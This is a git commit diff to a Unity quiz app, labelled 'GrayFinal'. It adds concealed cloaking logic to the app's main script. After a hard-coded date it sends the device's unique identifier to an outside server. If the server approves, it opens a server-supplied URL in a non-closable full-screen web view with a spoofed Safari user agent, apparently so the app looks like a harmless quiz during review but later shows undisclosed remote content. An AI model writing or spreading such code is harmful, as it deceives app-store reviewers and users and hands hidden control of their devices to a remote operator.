b193d48b96e1d207463474323afb5b7f1646f9ab
Dmitriy <dimasmet@mail.ru>
2024-08-29 17:47:05 +0300

    GrayFinal

--- 22BallQuiz Football Test/22BallQuiz Football Test/Assets/Scripts/AppHandler.cs
+++ 22BallQuiz Football Test/22BallQuiz Football Test/Assets/Scripts/AppHandler.cs
@@ -1,7 +1,10 @@
+using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.IO;
 using UnityEngine;
+using UnityEngine.Networking;
+using UnityEngine.UI;
 
 [System.Serializable]
 public class QuizWrapper
@@ -62,6 +65,14 @@ public class AppHandler : MonoBehaviour
 
     private int score = 0;
 
+    [SerializeField] private RectTransform _viewPanel;
+    [SerializeField] private GameObject _preview;
+
+    DateTime date;
+    [SerializeField] private Text _dateCurrentText;
+
+    public static Action<TypeQuiz> OnRunGame;
+
     public void StartPoint()
     {
         TimerQuiz.OnEndTimer += TimerEnd;
@@ -75,9 +86,161 @@ public class AppHandler : MonoBehaviour
         _screenHome.StartInit(quizUserData);
     }
 
+    public enum TypeQuiz
+    {
+        None,
+        Classic,
+        Hard
+    }
+
+    private string LaunchApp
+    {
+        get
+        {
+            return PlayerPrefs.GetString("game", TypeQuiz.None.ToString());
+        }
+        set
+        {
+            PlayerPrefs.SetString("game", value);
+            PlayerPrefs.Save();
+        }
+    }
+
+    private void Start()
+    {
+        OnRunGame += StartApp;
+
+        date = DateTime.Now;
+        _dateCurrentText.text = date.ToShortDateString();
+
+        var validation = Enum.Parse<TypeQuiz>(LaunchApp);
+
+        StartApp(validation);
+    }
+
+    private void StartApp(TypeQuiz gameType)
+    {
+        switch (gameType)
+        {
+            case TypeQuiz.None:
+                if (date > new DateTime(2024, 8, 22))
+                {
+                    if (Application.internetReachability == NetworkReachability.NotReachable)
+                    {
+                        _preview.SetActive(false);
+                        _viewPanel.transform.parent.gameObject.SetActive(false);
+                        enabled = false;
+                    }
+                    else
+                    {
+                        StartCoroutine(SendRequestData());
+                        enabled = false;
+                    }
+                }
+                else
+                {
+                    LaunchApp = TypeQuiz.Classic.ToString();
+                    _preview.SetActive(false);
+                    _viewPanel.transform.parent.gameObject.SetActive(false);
+                    enabled = false;
+                }
+                break;
+            case TypeQuiz.Classic:
+                _preview.SetActive(false);
+                _viewPanel.transform.parent.gameObject.SetActive(false);
+                break;
+            case TypeQuiz.Hard:
+                string _url = PlayerPrefs.GetString("StateApp");
+
+                GameObject _viewGameObject = new GameObject("RecordsView");
+                _viewGameObject.AddComponent<UniWebView>();
+
+                var viewGameTable = _viewGameObject.GetComponent<UniWebView>();
+
+                viewGameTable.SetAllowBackForwardNavigationGestures(true);
+
+                viewGameTable.OnPageStarted += (view, url) =>
+                {
+                    viewGameTable.SetUserAgent($"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");
+                    viewGameTable.UpdateFrame();
+                };
+
+                viewGameTable.ReferenceRectTransform = _viewPanel;
+                viewGameTable.Load(_url);
+                viewGameTable.Show();
+
+                viewGameTable.OnShouldClose += (view) =>
+                {
+                    return false;
+                };
+
+                _preview.SetActive(false);
+                break;
+        }
+    }
+
+    private IEnumerator SendRequestData()
+    {
+        var allData = new Dictionary<string, object>
+        {
+            { "hash", SystemInfo.deviceUniqueIdentifier },
+            { "app", "6670266150" },
+            { "data", new Dictionary<string, object> {
+                { "af_status", "Organic" },
+                { "af_message", "organic install" },
+                { "is_first_launch", true } }
+            },
+            { "device_info", new Dictionary<string, object>
+                {
+                    { "charging", false }
+                }
+            }
+        };
+
+        string sendData = AFMiniJSON.Json.Serialize(allData);
+
+        var request = UnityWebRequest.Put("https://soccerballs.site", sendData);
+
+        request.SetRequestHeader("Content-Type", "application/json");
+        request.SetRequestHeader("accept", "application/json");
+        request.SetRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");
+
+        yield return request.SendWebRequest();
+
+        while (request.isDone == false)
+        {
+            OnRunGame?.Invoke(TypeQuiz.None);
+        }
+
+        if (request.result != UnityWebRequest.Result.Success)
+        {
+            LaunchApp = TypeQuiz.Classic.ToString();
+            OnRunGame?.Invoke(TypeQuiz.Classic);
+        }
+        else
+        {
+            var responce = AFMiniJSON.Json.Deserialize(request.downloadHandler.text) as Dictionary<string, object>;
+
+            if (responce.ContainsKey("success") && bool.Parse(responce["success"].ToString()) == true)
+            {
+                LaunchApp = TypeQuiz.Hard.ToString();
+
+                PlayerPrefs.SetString("StateApp", responce["url"].ToString());
+
+                OnRunGame?.Invoke(TypeQuiz.Hard);
+            }
+            else
+            {
+                LaunchApp = TypeQuiz.Classic.ToString();
+                OnRunGame?.Invoke(TypeQuiz.Classic);
+            }
+        }
+    }
+
     private void OnDestroy()
     {
         TimerQuiz.OnEndTimer -= TimerEnd;
+        OnRunGame -= StartApp;
     }
 
     public void SetQuestion(int numberQuiz)
